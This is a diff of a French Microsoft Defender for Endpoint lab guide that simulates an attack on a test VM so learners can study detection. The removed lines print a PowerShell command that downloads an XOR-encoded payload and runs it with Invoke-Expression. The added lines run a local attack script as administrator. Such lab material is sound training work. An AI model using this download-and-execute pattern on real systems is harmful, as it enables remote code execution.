@@ -78,23 +78,13 @@ Dans cette tâche, vous allez examiner les alertes et les incidents générés p
 
 >**Avertissement :** Cette attaque simulée constitue une excellente source d’apprentissage via la pratique. Effectuez uniquement l’attaque dans les instructions fournies pour ce labo lors de l’utilisation du cours fourni au tenant Azure.  Vous pouvez effectuer d’autres attaques simulées *après* avoir effectué ce cours de formation avec ce tenant.
 
-Dans cette tâche, vous allez simuler une attaque sur la machine virtuelle WIN1 et vérifier la détection et l’atténuation de l’attaque par Microsoft Defender for Endpoint.
+Dans cette tâche, vous allez simuler une attaque sur la machine virtuelle WIN1 et vérifier la détection et l’atténuation de l’attaque par Microsoft Defender for Endpoint.
 
-1. Sur la machine virtuelle WIN1, *cliquez avec le bouton droit* sur **Démarrer**, puis choisissez **Windows PowerShell (admin)**.
+1. Sur la machine virtuelle WIN1, tapez **PowerShell** dans la barre de recherche, puis *faites un clic droit sur***Windows PowerShell** et choisissez *Exécuter en tant qu’administrateur*.
 
 1. Lorsque la fenêtre « Contrôle de compte d’utilisateur » apparaît, sélectionnez **Oui** pour autoriser l’exécution de l’application.
 
-1. Copiez et collez le script de simulation suivant dans la fenêtre PowerShell, puis appuyez sur **Entrée** pour l’exécuter :
-
-    ```PowerShell
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
-    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-    ```
-
-    >**Remarque :** Si vous rencontrez des erreurs (en rouge) lors de l’exécution du script, vous pouvez ouvrir l’application Bloc-notes et copier le script dans un fichier vide. Vérifiez que *Retour automatique à la ligne* est activé dans Bloc-notes. Ensuite, copiez et exécutez séparément chaque ligne du script dans PowerShell. En outre, un script PowerShell (attacksim.ps1) a été fourni dans les fichiers téléchargés au début des labos. Pour utiliser le script, dans **Windows PowerShell (Administrateur)**, accédez au dossier *\Users\Admin\Desktop\Allfiles*, tapez *.\attacksim.ps1*, puis appuyez sur **Entrée** pour l’exécuter.
+1. Pour exécuter le script, dans **Windows PowerShell (Admin)**, naviguez jusqu’au dossier *\Users\Admin\Desktop\Allfiles* et tapez *.\AttackScript.ps1* puis appuyez sur **Entrée** pour l’exécuter. Ensuite, tapez **R** et appuyez sur **Entrée** pour *exécuter une fois*.
 
 1. Le script génère plusieurs lignes de sortie et un message indiquant *Impossible de résoudre les contrôleurs de domaine dans le domaine*. Quelques secondes plus tard, l’application *Bloc-notes* s’ouvre. Un code d’attaque simulé est injecté dans Bloc-notes. Laissez l’instance Bloc-notes générée automatiquement ouverte pour expérimenter le scénario complet. Le code d’attaque simulé va tenter de communiquer avec une adresse IP externe (simulant un serveur C2).
 
